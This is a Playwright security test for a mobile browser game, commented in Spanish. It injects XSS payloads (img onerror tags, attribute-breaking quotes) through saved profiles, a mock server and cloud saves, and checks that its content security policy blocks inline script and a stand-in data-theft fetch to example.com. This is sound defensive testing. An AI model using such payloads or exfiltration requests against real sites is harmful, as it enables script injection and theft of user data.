/**
 * Prueba de seguridad de la página del juego. Comprueba, en un navegador de verdad:
 *
 *   1. Que nada de lo que viene de fuera se vuelve HTML: se meten cargas de ataque (una etiqueta
 *      <img onerror> y unas comillas que cierran un atributo) en el perfil guardado, en lo que
 *      contesta el servidor y en un progreso bajado de la nube, y no debe aparecer ninguna
 *      etiqueta de esas en la página ni ejecutarse nada.
 *   2. Que la política de contenido (la arma build.mjs) no estorba al juego (cero avisos jugando)
 *      y sí frena lo que debe: código puesto en un atributo y conexiones a otros servidores.
 *   3. Que en la app de publicación no existen las ayudas de prueba (window.__giro… ni cambiar
 *      de servidor con localStorage.giro_api).
 *
 * No sale nada a internet: toda petición http(s) que no vaya al servidor de mentira de esta
 * misma prueba se corta antes de salir.
 *
 *   node test/seguridad.mjs [--html <archivo>]
 */
import fs from 'node:fs';
import http from 'node:http';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { chromium } from 'playwright-core';
import { findChrome } from './navegador.mjs';

const here = path.dirname(fileURLToPath(import.meta.url));
const args = process.argv.slice(2);
const HTML = path.resolve(
  args.includes('--html') ? args[args.indexOf('--html') + 1] : path.join(here, '../../demo-juego.html'),
);
const THREE = fs.readFileSync(path.join(here, '../../app/android/src/main/assets/game/three.min.js'));

/* las cargas: si alguna llega a la página como HTML, deja un elemento con id "xss…" */
const IMG = (tag) => `<img src=x id=xss-${tag} onerror="window.__xss.push('${tag}')">`;
const QUOTE = (tag) => `"><b id=xss-${tag}>x</b><i a="`;
const BOTH = (tag) => IMG(tag) + QUOTE(tag + 'q');

/* la semana en curso, como la calcula core/dates.js */
function week() {
  const d = new Date(),
    m = new Date(d.getFullYear(), d.getMonth(), d.getDate() - ((d.getDay() + 6) % 7)),
    two = (n) => String(n).padStart(2, '0');
  return m.getFullYear() + '-' + two(m.getMonth() + 1) + '-' + two(m.getDate());
}

/* ---------- servidor de mentira: contesta con cargas de ataque en cada campo ---------- */
const hostile = {
  cup: () => ({
    week: week(),
    ends: 3600,
    total: BOTH('total'),
    saved: true,
    top: [
      { nick: BOTH('topnick'), time: 90, me: false },
      { nick: 'Ana', time: BOTH('toptime'), me: true },
    ],
    me: { rank: BOTH('merank'), time: 40 },
  }),
  duel: () => ({
    code: 'ABC123',
    seed: 7,
    by: BOTH('by'),
    total: BOTH('dueln'),
    top: [{ nick: BOTH('rival'), time: 5 }],
    me: null,
  }),
  save: () => ({
    version: 9,
    at: Date.now(),
    data: {
      coins: BOTH('coins'),
      nick: BOTH('nick'),
      runs: 12,
      xp: BOTH('xp'),
      bossWins: BOTH('wins'),
      topSpace: [BOTH('space')],
      topTimes: [BOTH('times')],
      goal: BOTH('goal'),
      survMap: BOTH('map'),
      lang: BOTH('lang'),
      parts: [BOTH('part')],
      fit: { hull: BOTH('fit') },
      worlds: { [BOTH('worldkey')]: 1 },
      cup: { week: week(), best: 40, sent: true, rank: BOTH('rank'), total: BOTH('cuptotal'), passed: 0 },
      duels: [
        {
          code: BOTH('code'),
          seed: 7,
          by: BOTH('dby'),
          mine: 0,
          rank: 0,
          n: BOTH('dn'),
          rival: { nick: BOTH('dnick'), time: 5 },
        },
      ],
    },
  }),
};
const server = http.createServer((req, res) => {
  const cors = {
    'access-control-allow-origin': '*',
    'access-control-allow-headers': 'content-type, authorization',
    'access-control-allow-methods': 'GET, POST, PUT, DELETE, OPTIONS',
  };
  if (req.method === 'OPTIONS') return res.writeHead(204, cors).end();
  const url = req.url.split('?')[0];
  const body = url === '/v1/save' ? hostile.save() : url.startsWith('/v1/duel') ? hostile.duel() : hostile.cup();
  res.writeHead(200, { ...cors, 'content-type': 'application/json' }).end(JSON.stringify(body));
});
await new Promise((ok) => server.listen(0, '127.0.0.1', ok));
const API = 'http://127.0.0.1:' + server.address().port;

/* ---------- lo que se instala en la página antes que el juego ---------- */
function install({ profile, local, native }) {
  window.__xss = [];
  window.__csp = [];
  sessionStorage.setItem('giro_studio', '1'); // sin la pantalla del estudio (la revisa test/inicio.mjs)
  document.addEventListener('securitypolicyviolation', (e) =>
    window.__csp.push(e.violatedDirective + ' ' + e.blockedURI),
  );
  /* solo la primera vez: si el juego vuelve a arrancar (al traer un progreso), no se pisa lo que guardó */
  if (!sessionStorage.getItem('puesto')) {
    sessionStorage.setItem('puesto', '1');
    for (const [k, v] of Object.entries(local || {})) localStorage.setItem(k, v);
    if (profile && !native) localStorage.setItem('giro_estelar_demo', JSON.stringify(profile));
  }
  if (native) {
    /* como dentro de la app de publicación: existe el puente con Android y no es de pruebas */
    const saved = JSON.stringify(profile || {});
    window.GiroNative = {
      loadState: () => saved,
      saveState: () => {},
      haptic: () => {},
      heat: () => 0,
      isDebug: () => false,
      testApi: () => '',
      setReminder: () => {},
      reminderOn: () => false,
      noteStreak: () => {},
      noteCup: () => {},
      setLang: () => {},
      share: () => {},
      googleReady: () => false,
      googleSignIn: () => {},
      secretGet: () => '',
      secretSet: () => {},
      storeReady: () => false,
      storeProducts: () => {},
      storeBuy: () => {},
      storePending: () => {},
    };
  }
}
/* ¿quedó algo de las cargas en la página? */
const injected = () => ({
  ran: window.__xss.slice(),
  tags: [...document.querySelectorAll('[id^="xss-"]')].map((e) => e.id),
  handlers: document.querySelectorAll('[onerror]').length,
});

const browser = await chromium.launch({
  executablePath: findChrome(),
  args: ['--use-gl=angle', '--use-angle=swiftshader', '--enable-unsafe-swiftshader'],
});
let bad = 0;
const check = (ok, what, detail = '') => {
  console.log(`${ok ? '✓' : '✗'} ${what}${ok || !detail ? '' : ' → ' + detail}`);
  if (!ok) bad++;
};

async function open(setup) {
  const ctx = await browser.newContext({ viewport: { width: 390, height: 780 }, locale: 'es-CO' });
  const leaked = [];
  /* nada sale a internet: Three.js se sirve del archivo de la app (con su permiso de origen, para
     que valga la marca integrity) y lo demás, salvo el servidor de mentira, se corta */
  await ctx.route(/^https?:/, (r) => {
    const url = r.request().url();
    if (/three(\.min)?\.js/.test(url))
      return r.fulfill({
        contentType: 'application/javascript',
        headers: { 'access-control-allow-origin': '*' },
        body: THREE,
      });
    if (url.startsWith(API)) return r.continue();
    leaked.push(url);
    return r.abort();
  });
  const page = await ctx.newPage();
  const errors = [];
  page.on('pageerror', (e) => errors.push(e.message));
  await page.addInitScript(install, setup);
  await page.goto(pathToFileURL(HTML).href);
  await page.waitForFunction(
    () => document.getElementById('mCoins') && document.getElementById('mCoins').textContent.trim(),
  );
  await page.waitForTimeout(400);
  return { ctx, page, leaked, errors };
}
const clean = (r) => !r.ran.length && !r.tags.length && !r.handlers;
const told = (r) => JSON.stringify(r);

/* ---------- 1a. el perfil guardado en el teléfono trae cargas ---------- */
{
  const profile = hostile.save().data;
  profile.nick = 'Ana'; // con apodo, para que la copa y los retos se muestren completos
  profile.duels.push({
    code: 'ABC123',
    seed: 7,
    by: 'Luis',
    mine: 0,
    rank: 0,
    n: 2,
    rival: { nick: BOTH('hud'), time: 5 },
  });
  const { ctx, page, errors } = await open({ profile, local: { giro_api: 'off' } });
  check(
    clean(await page.evaluate(injected)),
    'perfil con cargas: el lobby no las vuelve HTML',
    told(await page.evaluate(injected)),
  );
  for (const [name, go] of [
    ['copa', async () => page.click('#cupBtn')],
    ['retos', async () => page.click('#cupBox [data-k="tab"][data-v="duel"]')],
    [
      'tienda',
      async () => (
        await page.click('#cupBox [data-k="close"]').catch(() => page.keyboard.press('Escape')),
        page.click('#shopBtn')
      ),
    ],
  ]) {
    await go().catch((e) => check(false, 'abrir ' + name, String(e).split('\n')[0]));
    await page.waitForTimeout(250);
    check(clean(await page.evaluate(injected)), `perfil con cargas: ${name}`, told(await page.evaluate(injected)));
  }
  const kept = await page.evaluate(() => JSON.parse(localStorage.getItem('giro_estelar_demo') || '{}'));
  check(
    typeof kept.coins === 'number' || kept.coins === undefined,
    'perfil con cargas: las monedas quedan como número',
  );
  check(
    !/[<>"']/.test(JSON.stringify(kept).replace(/"/g, '')),
    'perfil con cargas: lo que se vuelve a guardar ya va limpio',
  );
  check(!errors.length, 'perfil con cargas: sin errores de la página', errors.join(' | '));
  await ctx.close();
}

/* ---------- 1b. jugar un reto cuyo rival trae una carga en el apodo (marcador y aviso) ---------- */
{
  const profile = {
    nick: 'Ana',
    runs: 5,
    duels: [{ code: 'ABC123', seed: 7, by: 'Luis', mine: 0, rank: 0, n: 2, rival: { nick: BOTH('hud'), time: 5 } }],
  };
  const { ctx, page } = await open({ profile, local: { giro_api: 'off' } });
  await page.click('#cupBtn');
  await page.click('#cupBox [data-k="tab"][data-v="duel"]');
  await page.click('#cupBox [data-k="playduel"]');
  await page.waitForTimeout(2500);
  check(
    clean(await page.evaluate(injected)),
    'reto con apodo de ataque: marcador y aviso',
    told(await page.evaluate(injected)),
  );
  await ctx.close();
}

/* ---------- 1c. el servidor contesta con cargas (copa y retos) ---------- */
{
  const profile = {
    nick: 'Ana',
    runs: 5,
    uid: 'a'.repeat(24),
    cup: { week: week(), best: 40, sent: true, rank: 3, total: 9, passed: 0 },
  };
  const { ctx, page, errors } = await open({ profile, local: { giro_api: API } });
  await page.click('#cupBtn');
  await page.waitForTimeout(700);
  check(
    clean(await page.evaluate(injected)),
    'servidor con cargas: tabla de la copa',
    told(await page.evaluate(injected)),
  );
  await page.click('#cupBox [data-k="tab"][data-v="duel"]');
  await page.fill('#duelCode', 'ABC123');
  await page.click('#cupBox [data-k="joinduel"]');
  await page.waitForTimeout(700);
  check(
    clean(await page.evaluate(injected)),
    'servidor con cargas: un reto traído del servidor',
    told(await page.evaluate(injected)),
  );
  const duel = await page.evaluate(() => (JSON.parse(localStorage.getItem('giro_estelar_demo')).duels || [])[0]);
  check(
    !!duel && typeof duel.n === 'number' && !/[<>"]/.test(duel.by + duel.rival.nick),
    'servidor con cargas: el reto se guarda limpio',
    JSON.stringify(duel),
  );
  check(!errors.length, 'servidor con cargas: sin errores de la página', errors.join(' | '));
  await ctx.close();
}

/* ---------- 1d. un progreso de la nube con cargas: se trae solo al abrir, y al elegir entre dos ---------- */
{
  const signed = { giro_api: API, giro_google: '1', giro_session: 'k'.repeat(43) };
  /* teléfono sin nada pendiente: lo de la nube se adopta sin preguntar y el juego vuelve a arrancar */
  let { ctx, page, errors } = await open({ profile: { acct: { v: 1, at: 1, sum: 'x' } }, local: signed });
  await page
    .waitForFunction(() => (JSON.parse(localStorage.getItem('giro_estelar_demo') || '{}').acct || {}).v === 9, null, {
      timeout: 15000,
    })
    .catch(() => {});
  await page.waitForTimeout(1200);
  const got = await page.evaluate(() => JSON.parse(localStorage.getItem('giro_estelar_demo') || '{}'));
  check((got.acct || {}).v === 9, 'nube con cargas: el progreso de la nube se adoptó');
  check(
    typeof got.coins === 'number' && !/[<>]/.test(JSON.stringify(got)),
    'nube con cargas: lo adoptado queda limpio',
    JSON.stringify(got).slice(0, 200),
  );
  check(
    clean(await page.evaluate(injected)),
    'nube con cargas: el lobby tras adoptarlo',
    told(await page.evaluate(injected)),
  );
  check(!errors.length, 'nube con cargas: sin errores de la página', errors.join(' | '));
  await ctx.close();
  /* teléfono con progreso propio: sale la pantalla para elegir, con las cifras de los dos */
  ({ ctx, page, errors } = await open({ profile: { runs: 5, coins: 500, xp: 40 }, local: signed }));
  await page.evaluate(() => window.__giroProfile({ acct: { v: 1, at: 1, sum: 'otra' } }));
  await page.reload();
  await page.waitForSelector('#account.show [data-acct="cloud"]', { timeout: 15000 }).catch(() => {});
  check(
    await page.evaluate(() => !!document.querySelector('#account.show [data-acct="cloud"]')),
    'nube con cargas: sale la pantalla para elegir',
  );
  check(
    clean(await page.evaluate(injected)),
    'nube con cargas: la pantalla para elegir',
    told(await page.evaluate(injected)),
  );
  await ctx.close();
}

/* ---------- 2. la política de contenido ---------- */
{
  const { ctx, page, leaked, errors } = await open({ profile: { nick: 'Ana', runs: 5 }, local: { giro_api: 'off' } });
  /* un paseo por el juego: menús, taller, una partida con música */
  for (const sel of ['#garageBtn', '#garageBack', '#shopBtn', '#shopClose', '#survBtn', '[data-map="fuego"]']) {
    await page.click(sel).catch((e) => check(false, 'paseo: ' + sel, String(e).split('\n')[0]));
    await page.waitForTimeout(300);
  }
  await page.waitForTimeout(3000);
  const quiet = await page.evaluate(() => window.__csp.slice());
  check(!quiet.length, 'política: jugar no dispara ningún aviso', quiet.join(' | '));
  check(!errors.length, 'política: sin errores de la página', errors.join(' | '));
  /* ahora, a propósito: código en un atributo, código pegado a la página y una conexión a otro servidor */
  const blocked = await page.evaluate(async () => {
    const box = document.createElement('div');
    box.innerHTML = '<img src="data:image/png;base64,AAAA" onerror="window.__xss.push(1)">';
    document.body.appendChild(box);
    const s = document.createElement('script');
    s.textContent = 'window.__xss.push(2)';
    document.body.appendChild(s);
    let fetched = 'salió';
    try {
      await fetch('https://example.com/robo?llave=1');
    } catch (e) {
      fetched = 'frenada';
    }
    await new Promise((r) => setTimeout(r, 400));
    return { ran: window.__xss.slice(), fetched, csp: window.__csp.slice() };
  });
  check(!blocked.ran.length, 'política: el código colado en la página no se ejecuta', told(blocked));
  check(
    blocked.fetched === 'frenada' && blocked.csp.some((v) => v.startsWith('connect-src')),
    'política: no deja conectar con otro servidor',
    told(blocked),
  );
  check(
    !leaked.some((u) => u.includes('example.com')),
    'política: la conexión se frenó antes de salir',
    leaked.join(' | '),
  );
  await ctx.close();
}

/* ---------- 3. en la app de publicación no hay ayudas de prueba ---------- */
{
  const lab = await open({ profile: { runs: 1 }, local: { giro_api: 'off' } });
  check(
    await lab.page.evaluate(() => typeof window.__giroState === 'function'),
    'laboratorio: las ayudas de prueba existen',
  );
  await lab.ctx.close();
  /* con el puente de Android y sin ser app de pruebas; se le deja escrito otro servidor, que no debe usar */
  const app = await open({
    profile: { nick: 'Ana', runs: 5, uid: 'b'.repeat(24) },
    local: { giro_api: API },
    native: true,
  });
  const hooks = await app.page.evaluate(() =>
    Object.keys(window).filter((k) => /^__giro(State|Profile|Push|Seed|World|Map|Hit|Boss|Peak|Track)/.test(k)),
  );
  check(!hooks.length, 'app de publicación: no existen las ayudas de prueba', hooks.join(', '));
  const seen = [];
  app.page.on('request', (r) => seen.push(r.url()));
  await app.page.click('#cupBtn');
  await app.page.waitForTimeout(800);
  check(
    !seen.some((u) => u.startsWith(API)),
    'app de publicación: ignora el servidor escrito en localStorage.giro_api',
    seen.join(' | '),
  );
  await app.ctx.close();
}

await browser.close();
server.close();
console.log(
  bad
    ? `\n${bad} comprobaciones fallaron.`
    : '\n✓ Nada de fuera se vuelve código, la política frena lo que debe y la app no trae ayudas de prueba.',
);
process.exitCode = bad ? 1 : 0;
